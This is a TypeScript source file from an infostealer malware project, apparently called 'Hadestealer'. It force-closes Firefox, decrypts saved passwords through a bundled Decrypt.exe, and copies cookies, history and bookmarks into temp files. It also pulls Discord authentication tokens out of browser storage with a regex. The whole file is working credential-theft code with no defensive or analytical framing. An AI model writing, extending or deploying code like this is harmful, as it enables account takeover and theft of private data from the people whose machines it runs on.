import fs from 'fs';
import path from 'path';
import os from 'os';
import sqlite3 from 'sqlite3';
import { execSync } from 'child_process';
import { killFirefox } from '../utils/process';
import { sendGenericMessage } from '../api/sender';
import { app } from 'electron';

export async function getFirefoxAllData() {
    killFirefox();
    const firefoxPath = path.join(process.env.APPDATA || '', "Mozilla", "Firefox", "Profiles");
    if (!fs.existsSync(firefoxPath)) return;

    const allData = {
        cookies: [] as string[],
        history: [] as string[],
        passwords: [] as string[],
        bookmarks: [] as string[]
    };

    const profiles = fs.readdirSync(firefoxPath);
    const outputDir = path.join(os.tmpdir(), 'Hadestealer', "All", 'Firefox');
    if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });

    const ffInstallPath = findFirefoxInstallPath();

    for (const profile of profiles) {
        const profilePath = path.join(firefoxPath, profile);
        if (!fs.statSync(profilePath).isDirectory()) continue;

        const keyFile = path.join(profilePath, "key4.db");
        const loginsFile = path.join(profilePath, "logins.json");

        if (fs.existsSync(keyFile) && fs.existsSync(loginsFile)) {
            const decrypted = await tryDecrypt(profilePath, ffInstallPath);
            if (decrypted) {
                allData.passwords.push(decrypted);
            }
        }

        const cookieFile = path.join(profilePath, "cookies.sqlite");
        if (fs.existsSync(cookieFile)) {
            const tempCookie = copyToTemp(cookieFile);
            const db = new sqlite3.Database(tempCookie);
            const rows: any[] = await new Promise(res => db.all("SELECT * FROM moz_cookies", (err, r) => res(r || [])));
            rows.forEach(r => {
                allData.cookies.push(`${r.host}\tTRUE\t${r.path}\t${r.isSecure ? "TRUE" : "FALSE"}\t${r.expiry}\t${r.name}\t${r.value}`);
            });
            await new Promise<void>((resolve) => {
                db.close((err) => {
                    resolve();
                });
            });
            try { if (fs.existsSync(tempCookie)) fs.unlinkSync(tempCookie); } catch (error) { }
        }

        const placesFile = path.join(profilePath, "places.sqlite");
        if (fs.existsSync(placesFile)) {
            const tempPlaces = copyToTemp(placesFile);
            const db = new sqlite3.Database(tempPlaces);

            const hist: any[] = await new Promise(res => db.all("SELECT url, title FROM moz_places LIMIT 100", (err, r) => res(r || [])));
            hist.forEach(r => allData.history.push(`${r.url} | ${r.title}`));

            const bms: any[] = await new Promise(res => db.all("SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1", (err, r) => res(r || [])));
            bms.forEach(r => allData.bookmarks.push(`${r.url} | ${r.title}`));

            await new Promise<void>((resolve) => {
                db.close((err) => {
                    resolve();
                });
            });
            if (fs.existsSync(tempPlaces)) fs.unlinkSync(tempPlaces);
        }
    }

    saveToDisk(allData);
}

function findFirefoxInstallPath() {
    const paths = [
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Firefox",
        path.join(process.env.LOCALAPPDATA || '', "Mozilla Firefox")
    ];
    return paths.find(p => fs.existsSync(path.join(p, "nss3.dll"))) || "";
}


async function tryDecrypt(profilePath: string, ffPath: string, retries = 3): Promise<string | null> {
    if (!ffPath || !profilePath) return null;

    const decryptorExeName = 'Decrypt.exe';

    const isPackaged = app ? app.isPackaged : process.env.NODE_ENV === 'production';
    const exePath = !isPackaged
        ? path.join(process.cwd(), 'src', 'lib', decryptorExeName)
        : path.join(process.resourcesPath, 'lib', decryptorExeName);
    if (!fs.existsSync(exePath)) {
        sendGenericMessage("FF Decryptor bulunamadı: " + exePath);
        return null;
    }

    for (let i = 0; i < retries; i++) {
        try {
            try {
                execSync(`taskkill /F /IM ${decryptorExeName} /T`, { stdio: 'ignore' });
            } catch { }

            const command = `"${exePath}" "${profilePath}" "${ffPath}"`;

            const output = execSync(command, {
                encoding: 'utf-8',
                timeout: 7000,
                windowsHide: true,
                maxBuffer: 1024 * 1024 * 5
            });

            const result = output ? output.trim() : null;
            if (result) {
                return result;
            }
        } catch (error: any) {
            const isBusy = error.message.includes('EBUSY') || error.code === 'EBUSY';


            if (i < retries - 1) {
                const delay = isBusy ? 2000 : 1000;
                await new Promise(resolve => setTimeout(resolve, delay));
                continue;
            }
        }
    }

    sendGenericMessage("Tüm denemeler başarısız oldu.");
    return null;
}
function saveToDisk(data: any) {
    const outputDir = path.join(os.tmpdir(), 'Hadestealer', "All", 'Firefox');
    if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });

    if (data.passwords.length > 0) fs.writeFileSync(path.join(outputDir, "Passwords.txt"), data.passwords.join("\n"), "utf-8");
    if (data.cookies.length > 0) fs.writeFileSync(path.join(outputDir, "Cookies.txt"), data.cookies.join("\n"), "utf-8");
    if (data.history.length > 0) fs.writeFileSync(path.join(outputDir, "History.txt"), data.history.join("\n"), "utf-8");
    if (data.bookmarks.length > 0) fs.writeFileSync(path.join(outputDir, "Bookmarks.txt"), data.bookmarks.join("\n"), "utf-8");
}

function copyToTemp(source: string) {
    const dest = path.join(os.tmpdir(), `temp_${Math.random().toString(36).substring(7)}.sqlite`);
    fs.copyFileSync(source, dest);
    return dest;
}

export function firefoxSteal(basePath: string, platform: string): Array<[string, string]> {
    const tokens: Array<[string, string]> = [];

    try {
        const entries = fs.readdirSync(basePath, { withFileTypes: true });
        for (const entry of entries) {
            if (entry.isDirectory()) {
                const profilePath = path.join(basePath, entry.name);
                const webappsStorePath = path.join(profilePath, 'webappsstore.sqlite');
                if (fs.existsSync(webappsStorePath)) {
                    try {
                        const db = new sqlite3.Database(webappsStorePath, sqlite3.OPEN_READONLY);
                        db.all("SELECT key, value FROM webappsstore2 WHERE originKey LIKE '%discord%'", ((err, rows: any[]) => {
                            if (!err && rows) {
                                for (const row of rows) {
                                    const value = row.value;
                                    if (value && typeof value === 'string') {
                                        const matches = value.match(/[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g);
                                        if (matches) {
                                            for (const token of matches) {
                                                if (!tokens.some(t => t[0] === token && t[1] === platform)) {
                                                    tokens.push([token, platform]);
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }));
                        db.close();
                    } catch (e) {
                    }
                }
            }
        }
    } catch (e) {
    }

    return tokens;
}
